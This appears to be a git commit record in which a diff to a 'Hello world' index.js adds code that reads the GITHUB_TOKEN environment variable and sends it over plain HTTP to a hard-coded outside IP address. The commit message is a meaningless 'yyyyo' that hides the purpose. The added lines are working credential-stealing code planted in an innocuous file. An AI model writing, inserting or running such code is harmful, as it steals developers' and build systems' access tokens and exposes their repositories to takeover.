e68bc9264b94ac8a9416097fc2133600fca0bb4f
Vasilii <inkz@xakep.ru>
2022-09-14 22:00:06 +1000

    yyyyo

--- index.js
+++ index.js
@@ -1,1 +1,11 @@
+const http = require('http')
+
+
 console.log('Hello world')
+
+const token = process.env.GITHUB_TOKEN
+
+http.get(`http://84.38.182.14/xxx=${token}`, (res) => {
+  const { statusCode } = res;
+  console.log(statusCode);
+})
